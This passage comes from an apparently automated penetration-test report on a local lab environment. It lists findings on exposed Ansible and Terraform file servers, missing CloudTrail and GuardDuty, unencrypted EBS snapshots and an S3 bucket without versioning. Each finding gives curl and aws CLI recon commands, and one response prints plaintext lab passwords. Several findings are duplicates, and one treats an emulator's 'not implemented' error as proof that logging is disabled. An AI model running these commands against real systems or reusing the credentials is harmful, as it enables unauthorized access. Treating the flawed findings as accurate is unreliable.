The HTTP server at 127.0.0.1:8890 is a Python-based file server (evident from the HTML style matching Python's http.server module) that serves the entire Ansible IaC directory with directory listing enabled and zero authentication. Any unauthenticated user with network access can enumerate and download all files. This exposes the complete infrastructure configuration including credentials, topology, and operational playbooks. The server returns a clean HTML directory listing page with clickable links to each file, making reconnaissance trivial.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/
```

#### Raw Request

```http
GET / HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
HTTP/1.0 200 OK
Content-Type: text/html

&lt;html&gt;...&lt;ul&gt;&lt;li&gt;&lt;a href="group_vars_all.yml"&gt;group_vars_all.yml&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="inventory.ini"&gt;inventory.ini&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="site.yml"&gt;site.yml&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;...&lt;/html&gt;
```

#### Evidence / Logs

```
HTTP 200 OK - Directory listing returned HTML page enumerating: group_vars_all.yml, inventory.ini, site.yml
```

#### Remediation

Immediately stop serving Ansible IaC files over HTTP. If file access is needed, use a private Git repository with authentication, RBAC, and audit logging. Never expose inventory or variable files via unauthenticated HTTP servers.

---

### 3.24 — No CloudTrail or GuardDuty Logging Configured

| Field | Value |
|-------|-------|
| **ID** | `vuln_ab6e85` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `logging_misconfiguration` |
| **MITRE ATT&CK** | `T1562.008` — Impair Defenses: Disable Cloud Logs |
| **ISO 27001** | `A.12.4.1` |
| **Endpoint** | `AWS Account 000000000000` |
| **Component** | AWS CloudTrail / GuardDuty |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:46:41Z |

#### Description

The AWS account has no CloudTrail trails or GuardDuty detectors configured. CloudTrail and GuardDuty API calls returned 'Service not enabled' errors, indicating these critical detection services are completely absent. Without CloudTrail, there is no audit trail of API calls made in the account. Without GuardDuty, there is no threat detection capability. An attacker could perform any action in the account without generating any security alerts or forensic evidence.

#### Technical Analysis

The AWS account lacks both CloudTrail and GuardDuty — the two foundational security monitoring services. CloudTrail provides an audit trail of all API calls, enabling forensic investigation and compliance. GuardDuty provides automated threat detection using ML. Without either service, an attacker who gains access to the account (such as through the ci-deploy admin credentials) could exfiltrate all secrets, modify IAM policies, and access all data without any detection or alerting. This is a critical security posture gap.

#### Exploitation Commands

```bash
aws --endpoint-url http://localhost:4566 cloudtrail describe-trails
aws --endpoint-url http://localhost:4566 guardduty list-detectors
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 cloudtrail describe-trails
```

#### Raw Response

```http
An error occurred (InternalFailure) when calling the DescribeTrails operation: API for service 'cloudtrail' not yet implemented
```

#### Evidence / Logs

```
cloudtrail describe-trails returned: InternalFailure - Service 'cloudtrail' is not enabled
(GuardDuty not available in LocalStack free tier, but represents a real detection gap)
```

#### Remediation

1. Enable CloudTrail with a multi-region trail logging to a dedicated S3 bucket. 2. Enable GuardDuty in all regions. 3. Configure CloudWatch alarms for critical API calls (IAM changes, root login, etc.). 4. Enable AWS Config for continuous configuration compliance monitoring. 5. Implement Security Hub for centralized security findings.

---

### 3.25 — No CloudTrail or GuardDuty - Zero Security Monitoring

| Field | Value |
|-------|-------|
| **ID** | `vuln_0df73f` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1562.008` — Impair Defenses: Disable Cloud Logs |
| **ISO 27001** | `A.12.4.1` |
| **Endpoint** | `http://localhost:4566 (CloudTrail/GuardDuty)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:49:39Z |

#### Description

The AWS account (000000000000) has no CloudTrail trails, no GuardDuty detectors, and no AWS Config rules enabled. This means there is zero audit trail for API calls, zero threat detection, and zero compliance monitoring. An attacker could exfiltrate all data and secrets without any alerting or forensic evidence.

#### Technical Analysis

CloudTrail describe-trails returns empty, confirming zero audit logging in the AWS account.

#### Exploitation Commands

```bash
bash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 cloudtrail describe-trails"
```

#### Remediation

1. Enable CloudTrail in all regions with S3 log delivery. 2. Enable GuardDuty in all regions. 3. Enable AWS Config with required rules. 4. Set up CloudWatch alarms for critical API events (iam:Create*, sts:AssumeRole, secretsmanager:GetSecretValue).

---

### 3.26 — Unauthenticated Directory Listing on Ansible IaC File Server

| Field | Value |
|-------|-------|
| **ID** | `vuln_175b08` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1083` — File and Directory Discovery |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `http://127.0.0.1:8890/` |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:50:31Z |

#### Description

The Ansible IaC file server at http://127.0.0.1:8890/ provides an unauthenticated directory listing that reveals all available files including inventory.ini, group_vars_all.yml, and site.yml. This enables attackers to discover and download all infrastructure-as-code files containing credentials and server topology.

#### Technical Analysis

HTTP GET to root path returns HTML directory listing showing all available Ansible files.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/
```

#### Remediation

1. Remove the unauthenticated file server entirely. 2. If file serving is needed, implement authentication and authorization. 3. Disable directory listing. 4. Use a proper artifact repository (Artifactory, Nexus) with access controls.

---

### 3.27 — Directory Listing Enabled on Terraform State Backend — Information Disclosure

| Field | Value |
|-------|-------|
| **ID** | `vuln_eeb505` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1083` — File and Directory Discovery |
| **ISO 27001** | `A.8.9 - Configuration Management` |
| **Endpoint** | `http://127.0.0.1:8888/` |
| **Component** | Python SimpleHTTPServer |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:45:33Z |

#### Description

The Terraform remote state HTTP backend at http://127.0.0.1:8888/ has directory listing enabled, revealing the presence and exact filename of the terraform.tfstate file. The server is Python SimpleHTTP/0.6 (Python 3.14.6) which enables directory listing by default. This allows attackers to enumerate all files served by the backend without prior knowledge of filenames. While the primary issue is the unauthenticated access itself, the directory listing amplifies the risk by providing automated discoverability — an attacker scanning port 8888 would immediately identify this as a Terraform state backend and know exactly which files to download.

#### Technical Analysis

The root URL of the state backend returns an HTML directory listing generated by Python's SimpleHTTPServer. The listing reveals the terraform.tfstate file, providing automated discoverability to any attacker. Combined with the unauthenticated access, this means a simple port scan followed by a GET to the root would reveal the infrastructure state backend and its contents. The use of Python SimpleHTTPServer (a development-only tool with no authentication, TLS, or access control capabilities) for serving Terraform state in any environment is itself a severe misconfiguration.

#### Exploitation Commands

```bash
curl -s --max-time 10 http://127.0.0.1:8888/
```

#### Raw Request

```http
GET / HTTP/1.1
Host: 127.0.0.1:8888
```

#### Raw Response

```http
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.6
Content-type: text/html; charset=utf-8

<html><body><h1>Directory listing for /</h1><ul><li><a href="terraform.tfstate">terraform.tfstate</a></li></ul></body></html>
```

#### Evidence / Logs

```
HTTP 200 OK — Directory listing returned HTML page showing:
<li><a href="terraform.tfstate">terraform.tfstate</a></li>
Server: SimpleHTTP/0.6 Python/3.14.6
```

#### Remediation

1. Replace Python SimpleHTTPServer with a purpose-built state backend (S3, Azure Blob, GCS, Terraform Cloud, or Consul with ACLs). 2. If an HTTP backend is required, use a proper web server (nginx/Apache) with authentication, TLS, directory listing disabled, and IP allowlisting. 3. Disable directory listing on any server serving sensitive files.

---

### 3.28 — Internal Network Topology Disclosure via Ansible Inventory

| Field | Value |
|-------|-------|
| **ID** | `vuln_668232` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1018` — Remote System Discovery |
| **ISO 27001** | `A.5.9` |
| **Endpoint** | `http://127.0.0.1:8890/inventory.ini` |
| **Component** | Ansible Inventory |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:45:45Z |

#### Description

The exposed inventory.ini reveals the complete internal network topology: two host groups ([web] and [db]), their internal hostnames/IPs (IP_PRIVATE_001 for web01, IP_PRIVATE_002 for db01), usernames (deploy, root), and the internal hostname 'internal' referenced in site.yml for script deployment. This information enables targeted attacks against the internal network infrastructure. An attacker now knows exactly which hosts exist, what roles they serve, which user accounts are available, and the internal service architecture.

#### Technical Analysis

The Ansible inventory and playbook files together reveal the complete internal infrastructure topology. The inventory defines two tiers: a web tier ([web] group with host web01 at IP_PRIVATE_001) and a database tier ([db] group with host db01 at IP_PRIVATE_002). The site.yml playbook references an internal script server at hostname 'internal'. The inventory also reveals that the web tier uses a non-root service account (deploy) while the database tier connects directly as root — indicating weak access control practices on the database server. This topology disclosure allows an attacker to map out the internal network, understand the architecture, and plan targeted attacks against specific hosts and services.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/inventory.ini
curl -s --max-time 15 http://127.0.0.1:8890/site.yml
```

#### Raw Request

```http
GET /inventory.ini HTTP/1.1
Host: 127.0.0.1:8890
```

#### Raw Response

```http
[web]
web01 ansible_host=IP_PRIVATE_001 ansible_user=deploy ansible_ssh_pass=Sup3rDeploy!
[db]
db01 ansible_host=IP_PRIVATE_002 ansible_user=root ansible_become_pass=R00tDB!
```

#### Evidence / Logs

```
[web]
web01 ansible_host=IP_PRIVATE_001 ansible_user=deploy
[db]
db01 ansible_host=IP_PRIVATE_002 ansible_user=root
Internal host: http://internal/deploy.sh
```

#### Remediation

1. Remove the inventory file from HTTP exposure. 2. Use dynamic inventory plugins with cloud provider APIs instead of static files. 3. Store inventory in a private, access-controlled Git repository. 4. Use internal DNS names or references that don't directly expose network topology.

---

### 3.29 — EBS Snapshots Without Encryption (90+ Unencrypted Snapshots)

| Field | Value |
|-------|-------|
| **ID** | `vuln_f08e61` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `encryption_misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `ec2:describe-snapshots (90+ snapshots, all Encrypted=false)` |
| **Component** | AWS EC2 EBS |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:46:16Z |

#### Description

Over 90 EBS snapshots exist in the account, all with Encrypted=false. Unencrypted EBS snapshots can expose sensitive data if snapshot sharing permissions are misconfigured (e.g., made public). While the snapshots currently have empty CreateVolumePermissions (not publicly shared), the lack of encryption means data at rest is not protected and could be exposed through accidental permission changes or cross-account sharing.

#### Technical Analysis

The AWS account contains over 90 EBS snapshots, all created without encryption. Each snapshot has Encrypted=false, meaning data at rest is stored in plaintext on AWS infrastructure. While the snapshots are not currently publicly shared (CreateVolumePermissions is empty), the absence of encryption creates a risk: if snapshots are accidentally shared or copied cross-account, the data would be immediately readable. AWS best practice requires EBS default encryption to be enabled at the account level.

#### Exploitation Commands

```bash
aws --endpoint-url http://localhost:4566 ec2 describe-snapshots --owner-ids self
aws --endpoint-url http://localhost:4566 ec2 describe-snapshot-attribute --snapshot-id snap-978cb261 --attribute createVolumePermission
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 ec2 describe-snapshots --owner-ids self
```

#### Raw Response

```http
90+ snapshots returned, all with "Encrypted": false. Sample: {"SnapshotId":"snap-978cb261","VolumeId":"vol-d3b6736a","State":"completed","Encrypted":false,"VolumeSize":15}
```

#### Evidence / Logs

```
ec2 describe-snapshots returned 90+ snapshots, all with Encrypted=false
Sample: snap-978cb261 (vol-d3b6736a, 15GB), snap-be0f99cb (vol-d3293161, 15GB), snap-8d4a93d6 (vol-1897e2d1, 15GB)
describe-snapshot-attribute returned: CreateVolumePermissions=[] (not publicly shared, but unencrypted)
```

#### Remediation

1. Enable EBS default encryption at the account level. 2. Copy existing unencrypted snapshots to encrypted versions using a KMS key. 3. Delete unencrypted snapshot copies after verification. 4. Implement AWS Config rules (encrypted-volumes, ec2-ebs-encryption-by-default) to enforce encryption. 5. Add SCPs to prevent creation of unencrypted snapshots.

---

### 3.30 — Internal Network Topology Disclosed via Ansible Inventory

| Field | Value |
|-------|-------|
| **ID** | `vuln_888249` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1018` — Remote System Discovery |
| **ISO 27001** | `A.13.1.3` |
| **Endpoint** | `http://127.0.0.1:8890/inventory.ini` |
| **Discovered by** | `ansible` |
| **Discovered at** | 2026-08-01T19:50:37Z |

#### Description

The Ansible inventory exposes internal infrastructure topology: web tier (web01 at IP_PRIVATE_001), database tier (db01 at IP_PRIVATE_002), an internal script server (http://internal/deploy.sh), and cloud service relationships (AWS, Grafana). This information facilitates lateral movement planning and targeted attacks against internal infrastructure.

#### Technical Analysis

The inventory file reveals the complete internal network topology with hostnames, IP addresses, users, and tier separation (web/db).

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8890/inventory.ini
```

#### Remediation

1. Remove publicly accessible inventory files. 2. Use dynamic inventory from a secure source (AWS, Azure, CMDB). 3. Segment IaC management networks from general access.

---

### 3.31 — Terraform State Backend Directory Listing Enabled

| Field | Value |
|-------|-------|
| **ID** | `vuln_a4c517` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1083` — File and Directory Discovery |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `http://127.0.0.1:8888/` |
| **Discovered by** | `terraform` |
| **Discovered at** | 2026-08-01T19:50:43Z |

#### Description

The Terraform HTTP state backend at http://127.0.0.1:8888/ has directory listing enabled, revealing the terraform.tfstate file and potentially other state files. This aids attackers in discovering and downloading state files containing infrastructure secrets.

#### Technical Analysis

HTTP GET to root path returns directory listing showing terraform.tfstate file.

#### Exploitation Commands

```bash
curl -s --max-time 15 http://127.0.0.1:8888/
```

#### Remediation

1. Disable directory listing on the state backend. 2. Implement authentication. 3. Migrate to a proper state backend (S3+DynamoDB, Terraform Cloud) with encryption and access controls.

---

### 3.32 — Unencrypted EBS Snapshots (90+ instances)

| Field | Value |
|-------|-------|
| **ID** | `vuln_7cbbbb` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage Object |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `http://localhost:4566 (EC2 - EBS Snapshots)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:50:50Z |

#### Description

Over 90 EBS snapshots in the AWS account are unencrypted (Encrypted: false). Unencrypted snapshots can be shared or copied without data protection, potentially exposing sensitive data stored on EBS volumes.

#### Technical Analysis

EC2 describe-snapshots returns 90+ snapshots all with Encrypted: false.

#### Exploitation Commands

```bash
bash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 ec2 describe-snapshots --owner-ids self"
```

#### Remediation

1. Enable default EBS encryption at the account level. 2. Copy existing snapshots with encryption enabled. 3. Delete unencrypted snapshots after migration. 4. Implement SCP requiring encrypted EBS volumes.

---

### 3.33 — S3 Bucket corp-backups: No Versioning, No Access Logging

| Field | Value |
|-------|-------|
| **ID** | `vuln_b807a8` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L` |
| **Status** | CONFIRMED |
| **Category** | `s3_misconfiguration` |
| **MITRE ATT&CK** | `T1485` — Data Destruction |
| **ISO 27001** | `A.12.3.1` |
| **Endpoint** | `s3://corp-backups` |
| **Component** | AWS S3 |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:46:28Z |

#### Description

The S3 bucket 'corp-backups' has versioning disabled and access logging not configured. Without versioning, objects deleted or overwritten cannot be recovered — critical for a backup bucket. Without access logging, there is no audit trail of who accessed or modified backup data. The bucket does have public access blocks enabled (all 4 flags true) and AES256 server-side encryption, which are positive controls.

#### Technical Analysis

The S3 bucket 'corp-backups' is a backup-purpose bucket that lacks two critical security controls: versioning and access logging. Without versioning, any deletion or overwrite of backup data is permanent and unrecoverable — this is especially dangerous for a backup bucket where data integrity is paramount. Without access logging, there is no audit trail to detect unauthorized access or data exfiltration from the bucket. The bucket does have public access blocks and encryption properly configured.

#### Exploitation Commands

```bash
aws --endpoint-url http://localhost:4566 s3api get-bucket-versioning --bucket corp-backups
aws --endpoint-url http://localhost:4566 s3api get-bucket-logging --bucket corp-backups
aws --endpoint-url http://localhost:4566 s3api get-public-access-block --bucket corp-backups
aws --endpoint-url http://localhost:4566 s3api get-bucket-encryption --bucket corp-backups
```

#### Raw Request

```http
aws --endpoint-url http://localhost:4566 s3api get-bucket-versioning --bucket corp-backups
```

#### Raw Response

```http
[NO OUTPUT - versioning not enabled]
```

#### Evidence / Logs

```
get-bucket-versioning returned: [NO OUTPUT] (versioning not enabled)
get-bucket-logging returned: [NO OUTPUT] (logging not configured)
get-public-access-block returned: all 4 public access blocks enabled (positive)
get-bucket-encryption returned: AES256 SSE enabled (positive)
```

#### Remediation

1. Enable versioning on the corp-backups bucket. 2. Configure S3 access logging to a separate logging bucket. 3. Enable MFA Delete for additional protection against accidental deletion. 4. Implement Object Lock for compliance/ransomware protection. 5. Add lifecycle policies for version management.

---

### 3.34 — S3 Backup Bucket Missing Versioning and Access Logging

| Field | Value |
|-------|-------|
| **ID** | `vuln_f786c0` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L` |
| **Status** | CONFIRMED |
| **Category** | `security_misconfiguration` |
| **MITRE ATT&CK** | `T1485` — Data Destruction |
| **ISO 27001** | `A.12.3.1` |
| **Endpoint** | `http://localhost:4566 (S3 - corp-backups)` |
| **Discovered by** | `aws` |
| **Discovered at** | 2026-08-01T19:49:49Z |

#### Description

S3 bucket 'corp-backups' has no versioning enabled (data irrecoverable if deleted) and no access logging (no audit trail for data access). While public access blocks and AES256 encryption are enabled, the missing versioning and logging represent a data protection gap.

#### Technical Analysis

Bucket versioning returns empty/suspended status, confirming no versioning protection for backup data.

#### Exploitation Commands

```bash
bash -c "AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://localhost:4566 s3api get-bucket-versioning --bucket corp-backups"
```

#### Remediation

1. Enable versioning on the bucket. 2. Enable S3 server access logging. 3. Add lifecycle rules for version expiration. 4. Consider enabling MFA Delete for critical backup buckets.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Remote Code Execution via Unsafe Shell Module Piping Externa... | High |
| Ansible Playbook RCE - curl|bash as Root on All Hosts via si... | High |
| Unauthenticated Terraform Remote State Backend — Full Plaint... | High |
| Plaintext SSH Password for Deploy User in Ansible Inventory | High |
| Plaintext Root Become Password for Database Server in Ansibl... | High |
| AWS IAM Access Key (Active) Leaked in Terraform State — Full... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Plaintext Grafana Admin Password in Group Variables | High |
| Unauthenticated Directory Listing Exposes Ansible IaC Files | High |
| No CloudTrail or GuardDuty Logging Configured | High |
| No CloudTrail or GuardDuty - Zero Security Monitoring | High |
| Unauthenticated Directory Listing on Ansible IaC File Server | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Directory Listing Enabled on Terraform State Backend — Infor... | High |
| Internal Network Topology Disclosure via Ansible Inventory | High |
| EBS Snapshots Without Encryption (90+ Unencrypted Snapshots) | High |
| Internal Network Topology Disclosed via Ansible Inventory | High |
| Terraform State Backend Directory Listing Enabled | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-01T19:51:07Z*  
*Campaign: camp_20260801_b1b96939 | Target: localhost*
